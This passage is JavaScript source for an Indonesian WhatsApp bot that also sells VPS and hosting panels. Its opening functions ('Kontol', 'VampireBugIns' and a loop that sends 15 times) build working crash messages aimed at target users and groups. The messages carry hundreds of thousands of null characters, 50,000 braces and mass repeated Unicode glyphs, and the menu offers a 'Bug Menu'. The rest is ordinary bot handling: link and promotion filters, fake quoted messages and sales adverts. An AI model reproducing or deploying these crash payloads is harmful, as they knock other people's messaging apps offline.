text: `\`You Cant Escape From \"𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳 𝐕𝟖\"\``,
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson:  `{
"title":"\`¿Que Yuukey?\`",
"sections":[
{"title":"${"\u0000".repeat(900000)}",
"rows":[
{
"title":"Kono Yuukey Daa!!!", 
"description":"Wryyyyyyy", 
"rowId":".Katenawa Orewa Ho Da"
}, {
"title":"Kono Diaboro Daa!!!",
"description":"Epitapu",
"rowId":".Kingu Krimson"
}
]
}
]
}`
},
],
},
},
},
carouselMessage: {
cards: []
}, 
},
};
for (let i = 0; i <15; i++) {
await ZakzzDev.sendMessage(target, Yuukiy, { participant: { jid:target }, });
};
}

async function Kontol(target) {
  try {
    let zxv = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳 𝐕𝟖",
              hasMediaAttachment: false
            },
            body: {
              text: "Assalamualaikum!!", 
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(50000),     
            }
          }, 
        },
      },
    };
    
    await ZakzzDev.sendMessage(target, zxv, {
      messageId: null,
 
     userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function VampireBugIns(groupJid) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `120363403066612655@newsletter`,
                        newsletterName: "AlwaysZakzz V9" + "ꦾ".repeat(5000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(5000) + "@0".repeat(5000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                    },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            "screen_2_OptIn_0": true,
                            "screen_2_OptIn_1": true,
                            "screen_1_Dropdown_0": "nullOnTop",
                            "screen_1_DatePicker_1": "1028995200000",
                            "screen_1_TextInput_2": "null@gmail.com",
                            "screen_1_TextInput_3": "94643116",
                            "screen_0_TextInput_0": "\u0000".repeat(500000),
                            "screen_0_TextInput_1": "SecretDocu",
                            "screen_0_Dropdown_2": "#926-Xnull",
                            "screen_0_RadioButtonsGroup_3": "0_true",
                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: groupJid,
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await ZakzzDev.sendMessage(groupJid, message, {}); // Hapus userJid untuk grup
        console.log(`Success sending bug to group: ${groupJid}`);
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Depay"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

//~~~~~~~~~~ Event Settings ~~~~~~~~~//
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antipromosi) {
    const promoWords = [
        /jual/i, /beli/i, /promo/i, /jasher/i, /diskon/i, /murah/i, /order/i,
        /unchek/i, /akun/i, /cek bio/i, /kunjungi/i,
        /pesan sekarang/i, /hubungi/i, /transfer/i,
        /testi/i, /testimoni/i, /open/i, /closing/i, /script/i, /sell/i, /channel/i,
        /buy/i, /vps/i, /rilis/i, /balmod/i, /sukses/i, /suntik/i, /minat/i
    ];

    const isPromoDetected = promoWords.some(rx => rx.test(m.text || ""));

    if (
        isPromoDetected &&
        !isCreator &&
        !m.isAdmin &&
        m.isBotAdmin &&
        !m.fromMe
    ) {
        await ZakzzDev.sendMessage(m.chat, {
            text: `*⚠️ PROMOSI TERDETEKSI!*\n\n@${m.sender.split("@")[0]}, pesan kamu mengandung promosi dan telah dihapus.`,
            mentions: [m.sender]
        }, { quoted: m });

        try {
            await ZakzzDev.sendMessage(m.chat, { delete: m.key });
        } catch (err) {
            console.error(`[ANTIPROMOSI] Gagal hapus pesan: ${err.message}`);
        }
    }
}

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return ZakzzDev.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

// ===== ANTI LINK HANDLER =====
if (m.isGroup && db.groups[m.chat]) {
    const groupSettings = db.groups[m.chat];

    const allLinkRegex = /(https?:\/\/[^\s]+)/gi;

    const deleteMessage = async (msg) => {
        try {
            await ZakzzDev.sendMessage(m.chat, { delete: msg.key });
        } catch (err) {
            console.error(`[ANTILINK] Gagal hapus pesan: ${err.message}`);
        }
    };

    if (groupSettings.antilink && allLinkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin) {
        const thisGcLink = `https://chat.whatsapp.com/${await ZakzzDev.groupInviteCode(m.chat)}`;

        // Link grup sendiri boleh, lainnya hapus
        if (!m.text.includes(thisGcLink)) {
            await ZakzzDev.sendMessage(m.chat, {
                text: `*❌ Link Terdeteksi!*\n\n@${m.sender.split("@")[0]}, link tidak diperbolehkan di sini!`,
                mentions: [m.sender]
            }, { quoted: m });

            await deleteMessage(m);
        }
    }
}

if (setgbonly.active) {
    if (!m.isGroup) {
        return;
    }
}

if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await ZakzzDev.sendMessage(m.chat, {text: `
.🍁𝗟𝗜𝗦𝗧 𝗩𝗣𝗦 𝗗𝗜𝗚𝗜𝗧𝗔𝗟 𝗢𝗖𝗘𝗔𝗡 𝗕𝗬 𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇💫
[ 𝙷𝙸𝙶𝙷 𝚀𝚄𝙰𝙻𝙸𝚃𝚈 𝚅𝙿𝚂 𝙰𝚆𝙴𝚃 & 𝙻𝙰𝙽𝙲𝙰𝚁🥵🤙 ]

• 𝐑𝐀𝐌 𝟏𝟔 𝐂𝐎𝐑𝐄 𝟒 : 𝟓0𝐊
• 𝐑𝐀𝐌 𝟖 𝐂𝐎𝐑𝐄 𝟒 : 𝟒0𝐊
• 𝐑𝐀𝐌 𝟒 𝐂𝐎𝐑𝐄 𝟐 : 𝟑0𝐊
• 𝐑𝐀𝐌 𝟐 𝐂𝐎𝐑𝐄 𝟏 : 𝟐0𝐊
𝗡𝗘𝗚𝗢 𝗕𝗢𝗟𝗘𝗛 𝗔𝗦𝗔𝗟 𝗣𝗔𝗞𝗘 𝗢𝗧𝗔𝗞🧠

𝗞𝗘𝗨𝗡𝗧𝗨𝗡𝗚𝗔𝗡 & 𝗗𝗔𝗡 𝗕𝗢𝗡𝗨𝗦 𝗕𝗨𝗬 𝗩𝗣𝗦💫🔥
➠ ꜰʀᴇᴇ ɪɴꜱᴛᴀʟ ᴘᴀɴᴇʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ
➠ ꜰʀᴇᴇ ʀᴇQᴜᴇꜱᴛ ɴᴀᴍᴀ ᴅᴏᴍᴀɪɴ
➠ ꜰʀᴇᴇ ʀᴇQᴜᴇꜱᴛ ᴛʜᴇᴍᴀ ʀᴀᴍ 4+
➠ ꜰʀᴇᴇ ᴘᴀꜱᴀɴɢ ᴇɢɢ ɴᴏᴅᴊꜱ ᴠ20+
➠ ꜰʀᴇᴇ ᴘᴀꜱᴀɴɢ ᴇɢɢ ꜱᴀᴍᴘ ʟɪɴᴜx/ᴡɪɴᴅᴏᴡꜱ
➠ ꜰʀᴇᴇ ɪɴꜱᴛᴀʟ ɴᴏᴅᴇ+ᴡɪɴɢꜱ
➠ ɢᴀʀᴀɴꜱɪ 20 ᴅᴀʏꜱ 1x ʀᴇᴘʟᴀᴄᴇ🥵
➠ ꜰʀᴇᴇ ꜱᴄʀɪᴘᴛ ꜱɪᴍᴘʟᴇ ʙᴏᴛ ᴠ4/ᴠ5🔥
➠ ᴠᴘꜱ ꜱɪᴀᴘ ᴘᴀᴋᴀɪ ᴀɴᴛɪ ʀɪʙᴇᴛ💌
➠ ᴅᴘ ʙᴏʟᴇʜ ᴀꜱᴀʟ ʟᴜɴᴀꜱ😋

▬▭▬▭▬▭▬▭▬▭▬▭▬
𝗢𝗣𝗘𝗡 𝗝𝗔𝗦𝗔 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗔𝗡𝗘𝗟 𝗣𝗧𝗘𝗥𝗢𝗗𝗔𝗖𝗧𝗬𝗟 : 𝟳𝗞
𝗢𝗣𝗘𝗡 𝗝𝗔𝗦𝗔 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗧𝗛𝗘𝗠𝗔  𝗣𝗧𝗘𝗥𝗢𝗗𝗔𝗖𝗧𝗬𝗟 : 𝟱𝗞
▬▭▬▭▬▭▬▭▬▭▬▭▬
𝐋𝐈𝐒𝐓 𝐀𝐋𝐋 𝐓𝐄𝐀𝐌 𝐏𝐀𝐍𝐄𝐋 𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳🤙

𝘙𝘌𝘚𝘌𝘓𝘓𝘌𝘙 𝘗𝘈𝘕𝘌𝘓 𝘗𝘜𝘉𝘓𝘐𝘊 : 7𝘒
> 𝘙𝘌𝘚𝘌𝘓𝘓𝘌𝘙 𝘗𝘈𝘕𝘌𝘓 𝘗𝘙𝘐𝘝𝘈𝘛𝘌 : 10𝘒
𝘈𝘋𝘔𝘐𝘕 𝘗𝘈𝘕𝘌𝘓 𝘗𝘜𝘉𝘓𝘐𝘊 : 8𝘒
> 𝘈𝘋𝘔𝘐𝘕 𝘗𝘈𝘕𝘌𝘓 𝘗𝘙𝘐𝘝𝘈𝘛𝘌 : 12𝘒
𝘗𝘈𝘙𝘛𝘕𝘌𝘙 𝘗𝘈𝘕𝘌𝘓 𝘗𝘜𝘉𝘓𝘐𝘊 : 15𝘒
> 𝘗𝘈𝘙𝘛𝘕𝘌𝘙 𝘗𝘈𝘕𝘌𝘓 𝘗𝘙𝘐𝘝𝘈𝘛𝘌 : 20𝘒
𝘖𝘞𝘕𝘌𝘙 𝘗𝘈𝘕𝘌𝘓 𝘗𝘜𝘉𝘓𝘐𝘊 : 25𝘒
> 𝘖𝘞𝘕𝘌𝘙 𝘗𝘈𝘕𝘌𝘓 𝘗𝘙𝘐𝘝𝘈𝘛𝘌 : 30𝘒
𝗚𝗔𝗦𝗞𝗘𝗡 𝗖𝗨𝗬 𝗝𝗢𝗜𝗡 𝗔𝗡𝗧𝗜 𝗣𝗧𝗣𝗧 & 𝗣𝗘𝗥𝗠𝗔 𝗦𝗔𝗠𝗣𝗘 𝗣𝗘𝗡𝗦𝗜🥵🤙

▬▭▬▭▬▭▬▭▬▭▬▭▬
𝐋𝐈𝐒𝐓 𝐏𝐀𝐍𝐄𝐋 𝐏𝐓𝐄𝐑𝐎𝐃𝐀𝐂𝐓𝐘𝐋 𝐁𝐘 𝐀𝐥𝐰𝐚𝐲𝐬𝐙𝐚𝐤𝐳𝐳💫 

*RAM 1GB : RP 1.000*
*RAM 2GB : RP 2.000*
*RAM 3GB : RP 3.000*
*RAM 4GB : RP 4.000*
*RAM 5GB : RP 5.000*
*RAM 6GB : RP 6.000*
*RAM 7GB : RP 7.000*
*RAM 8GB : RP 8.000*
*RAM 9GB : RP 9.000*
*RAM 10GB : RP 10.000*
*RAM UNLIMITED PUBLIC : RP 8.000*
*RAM UNLIMITED PRIVATE SERVER PRIBADI : RP 12.000*

𝙆𝙀𝙐𝙉𝙏𝙐𝙉𝙂𝘼𝙉 𝘽𝙐𝙔 𝙋𝘼𝙉𝙀𝙇 𝙋𝙏𝙀𝙍𝙊𝘿𝘼𝘾𝙏𝙔𝙇 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝙎𝙀𝙍𝙑𝙀𝙍 𝙋𝙍𝙄𝘽𝘼𝘿𝙄
1. ꜱᴇʀᴠᴇʀ ʟᴀɴᴄᴀʀ ᴀɴᴛɪ ᴅᴇʟᴀʏ
2. ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ ᴄᴜᴍᴀɴ ꜱᴀʏᴀ ᴅᴏᴀɴɢ
3. ꜱᴇʀᴠᴇʀ ᴀɴᴛɪ ɪɴᴛɪᴘ ᴅᴀɴ ᴅᴇʟ ᴀᴍᴀɴ 100%
4. ᴍᴀꜱᴀ ᴀᴋᴛɪꜰ 30 ʜᴀʀɪ & ɢᴀʀᴀɴꜱɪ 20 ʜᴀʀɪ
𝗗𝗜 𝗝𝗔𝗠𝗜𝗡 𝗕𝗘𝗥𝗧𝗔𝗡𝗚𝗚𝗨𝗡𝗚 𝗝𝗔𝗪𝗔𝗕 𝗗𝗔𝗡 𝗡𝗬𝗔𝗠𝗔𝗡🥵🤙

▬▭▬▭▬▭▬▭▬▭▬▭▬
𝑴𝒊𝒏𝒂𝒕? 𝗛𝘂𝗯𝘂𝗻𝗴𝗶 :‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
🪀𝒘𝒉𝒂𝒕𝒔𝒂𝒑𝒑 : [ wa.me/6281315224632 ]
 📡 _Telegram_: [ t.me/Aliftzycrt ]
🗒️𝑻𝒆𝒔𝒕𝒊𝒎𝒐𝒏𝒊 : [https://whatsapp.com/channel/0029VbAbqrkBvvseV1Cpk73p]
🥏 𝒄𝒉𝒂𝒏𝒆𝒍 𝒘𝒂: [ https://whatsapp.com/channel/0029VbAbqrkBvvseV1Cpk73p ]
> © 𝕬𝖑𝖎𝖋𝖋🍓
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor (Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
  return ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: qtext });
};

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: ZakzzDev.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*AlwaysZakzz* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: ``, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `╭──(   PANEL PUBLIK🚀    )
║ᨒ RAM 1GB : Rp1.000/BULAN
│ᨒ RAM 2GB : Rp2.000/BULAN
║ᨒ RAM 3GB : Rp3.000/BULAN
│ᨒ RAM 4GB : Rp4.000/BULAN
║ᨒ RAM 5GB : Rp5.000/BULAN
│ᨒ RAM 6GB : Rp6.000/BULAN
║ᨒ RAM 7GB : Rp7.000/BULAN
│ᨒ RAM 8GB : Rp8.000/BULAN
║ᨒ RAM 9GB : Rp9.000/BULAN
│ᨒ RAM 10GB : Rp10.000/BULAN
║ᨒ RAM UNLI : Rp12.000/BULAN
╰━━━━━━━━━━━━━━━━━━━⬣
KENAPA MURAH BANG?KARNA GW TIDAK MENJAMIN SERVER AMAN CONTOHNYA:
KENA INTIP(LAPORAN AJA)
KECOLONGAN(LAPORAN AJA)
KENA RUSUH(LAPORAN AJA)
KENA DDOS
(JIKA KETAHUAN AKAN DI DEL)`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `╭──(    PANEL PRIVATE🚀    )
║ᨒ RAM 1GB : Rp1.500/BULAN
│ᨒ RAM 2GB : Rp3.000/BULAN
║ᨒ RAM 3GB : Rp4.000/BULAN
│ᨒ RAM 4GB : Rp5.000/BULAN
║ᨒ RAM 5GB : Rp6.500/BULAN
│ᨒ RAM 6GB : Rp8.000/BULAN
║ᨒ RAM 7GB : Rp9.000/BULAN
│ᨒ RAM 8GB : Rp10.000/BULAN
║ᨒ RAM 9GB : Rp11.000/BULAN
│ᨒ RAM 10GB : Rp12.000/BULAN
║ᨒ RAM UNLI : Rp13.000/BULAN
╰━━━━━━━━━━━━━━━━━━━⬣
*(PRIVATE SEDANG CLOSE❌)*
KENAPA MAHAL BANG?
SERVER PRIVATE
ANTI DDOS
ANTI RUSUH
ANTI KECOLONGAN SC
ANTI INTIP
ADMIN PANEL DIKIT`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await ZakzzDev.sendMessage(jid, msgii.message, {messageId: msgii.key.id})
}


//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "menu": {
  let teksnya = `╭──⧁ 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⧁──╮
  
ʜᴇʟʟ ᴀɢᴀɪɴ, ɪ ᴀᴍ 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩 ʙᴏᴛᴢ
ᴄʀᴇᴀᴛᴇᴅ ᴛᴏ ꜱᴇʀᴠᴇ, ɴᴏᴛ ᴛᴏ ᴏʙᴇʏ  
ᴅᴇꜱɪɢɴᴇᴅ ʙʏ 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩 ᴅᴇᴠ ꜱʏꜱᴛᴇᴍꜱ

• 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩
• 𝗩𝗲𝗿𝘀𝗶     : 𝘷𝟵.𝟶
• 𝗡𝗮𝗺𝗮 𝗕𝗼𝘁 : 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩 ʙᴏᴛᴢ
• 𝗠𝗼𝗱𝗲     : ${ZakzzDev.public ? "𝙿𝚄𝙱𝙻𝙸𝙲 ┃ ⚔︎ Open Mode" : "𝚂𝙴𝙻𝙵 ┃ 🛡︎ Private Mode"}
• 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}

❝ 𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 𝘈𝘭𝘸𝘢𝘺𝘴𝘡𝘢𝘬𝘻𝘻, 𝘕𝘰𝘵 𝘵𝘰 𝘈𝘭𝘰𝘯𝘦 ❞

⋮ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ꜱᴇᴍᴜᴀ ꜰɪᴛᴜʀ
`;

  await ZakzzDev.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: '𝙰𝚕𝚕𝚖𝚎𝚗𝚞' },
      type: 1
    },
    {
      buttonId: `.owner`,
      buttonText: { displayText: '𝙾𝚠𝚗𝚎𝚛' },
      type: 1
    },
    {
      buttonId: `.bugmenu`,
      buttonText: { displayText: '𝙱𝚞𝚐 𝙼𝚎𝚗𝚞' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./AlwaysZakzz.jpg"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
    isForwarded: true,
    mentionedJid: [m.sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `${botname} - ${versi}`,
      thumbnailUrl: "https://img1.pixhost.to/images/7898/631129887_alwayszakzz.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
});

break
}

case "allmenu": {
let teks = `
 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝗕𝗢𝗧𝗭 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩-𝚒𝚘𝚗 𝗩9 
─────────────────────────────
ʙᴏᴛ        : *${global.botname2}*
ᴠᴇʀꜱɪ      : *${global.versi}*
ᴍᴏᴅᴇ       : *${ZakzzDev.public ? "PUBLIC" : "SELF"}*
ᴄʀᴇᴀᴛᴏʀ    : @${global.owner}
ᴜᴘᴛɪᴍᴇ     : *${runtime(os.uptime())}*
ꜱᴛᴀᴛᴜꜱ     : *${isCreator ? "Owner" : isPremium ? "Reseller" : "VIP"}*
─────────────────────────────
𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩-𝚒𝚘𝚗 V9 — Simple • Fast • Powerfull
